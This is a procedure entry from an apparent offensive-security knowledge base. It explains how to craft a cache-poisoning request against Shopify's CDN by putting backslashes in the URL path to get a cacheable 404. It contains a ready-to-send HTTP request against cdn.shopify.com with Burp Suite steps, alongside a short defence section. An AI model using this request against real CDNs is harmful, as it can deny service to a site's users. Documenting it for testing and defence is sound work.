---
id: proc-uuid-002
tags:
  - cache-poisoning
  - path-modification
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/Modified-GET-Request-with-Backslashes-and-Cache-Buster]]'
verified: false
platforms:
  - Web
  - CDN
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:56.690Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Cache-Poisoning-Request-with-Backslashes

## Summary

This procedure modifies an intercepted legitimate request by replacing forward slashes with backslashes in the URL path and adding a cache buster parameter, exploiting the CDN's normalization behavior to trigger a 404 from the origin server while targeting the legitimate cache key.

## Description

Targeted at Shopify's CDN where the cache normalizes \ to / but the origin rejects \ paths with 404. In Burp Suite, edit the request path (e.g., from /static/javascripts/... to /static\javascripts\...) and append ?cachebuster=123. This isolates the test and prevents accidental production impact. Expected outcome: A crafted request that elicits a cacheable 404 under the normalized key.

## Requirements

1. Intercepted legitimate request from prior procedure
2. Burp Suite Repeater or Proxy with edit capabilities
3. Knowledge of target file paths on cdn.shopify.com

## Defense

Defensive measures and detection strategies:

- Normalize all path characters consistently across cache and origin
- Validate and sanitize URL paths to reject backslashes
- Log and alert on requests with non-standard path separators

## Objectives

1. Create request that triggers origin 404 due to backslashes
2. Ensure cache buster isolates test from production
3. Prepare for repetition to force caching

## Instructions

### Step 1: Edit Path in Burp Suite

**Context**: Replace forward slashes with backslashes to exploit normalization discrepancy, causing origin rejection.

**Command** ([[commands/Modified-GET-Request-with-Backslashes-and-Cache-Buster]]):
```http
GET /static\javascripts\vendor\bugsnag.v7.4.0.min.js?cachebuster=123 HTTP/1.1
Host: cdn.shopify.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

> In Burp, drop to Repeater, change path to use \. Expected output: When sent, 404 from origin.

### Step 2: Add Cache Buster Parameter

**Context**: Append query parameter to avoid caching interference with live traffic.

> Modify URL end to ?cachebuster=123. This ensures test requests don't affect users without the parameter.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/Modified-GET-Request-with-Backslashes-and-Cache-Buster]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- cache-poisoning
- path-modification
